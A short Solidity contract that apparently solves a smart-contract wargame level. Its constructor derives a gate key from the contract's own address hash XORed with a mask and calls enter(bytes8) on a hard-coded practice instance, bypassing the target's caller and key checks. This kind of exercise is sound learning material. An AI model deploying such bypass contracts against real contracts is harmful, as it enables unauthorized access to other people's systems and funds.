// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    bool status;
    // Your instance address
    address victim = 0x839A020252e613ca631B5909Cea705744389609c;
    bytes8 _mask = 0xffffffffffffffff;
    bytes8 public _gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ _mask;

    constructor() {
            (status, ) = victim.call(abi.encodeWithSignature("enter(bytes8)",_gateKey));
    }
}